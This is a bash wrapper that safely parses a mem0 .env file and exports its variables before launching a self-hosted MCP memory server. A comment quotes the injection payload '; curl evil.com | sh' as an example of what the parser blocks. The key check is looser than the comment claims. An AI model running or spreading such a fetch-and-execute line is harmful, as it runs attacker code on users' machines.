#!/usr/bin/env bash
set -euo pipefail

ENV_MEM0="${MCP_TOOLS_ROOT:-$HOME/mcp-tools}/.env.mem0"
if [ ! -f "$ENV_MEM0" ]; then
  echo "ERROR: $ENV_MEM0 no existe (corre 'mcp-tools env')" >&2
  exit 1
fi

# Parse KEY=VALUE lines; ignore comments/blank; reject shell-injection payloads.
# Only export lines whose key matches ^[A-Za-z_][A-Za-z0-9_]*$
# This blocks curl|bash style attacks where a user pastes an .env block from
# a tutorial that contains "; curl evil.com | sh" or similar.
while IFS= read -r line || [ -n "$line" ]; do
  # Strip leading whitespace
  line="${line#"${line%%[![:space:]]*}"}"
  # Skip blanks and shell comments
  case "$line" in
    ""|\#*) continue ;;
  esac
  # Require a separating `=` and a non-empty key
  case "$line" in
    *=*) ;;
    *) continue ;;
  esac
  key="${line%%=*}"
  val="${line#*=}"
  # Key must look like a shell variable name
  case "$key" in
    [A-Za-z_][A-Za-z0-9_]*) ;;
    *) continue ;;
  esac
  export "$key"="$val"
done < "$ENV_MEM0"

exec mem0-mcp-selfhosted "$@"
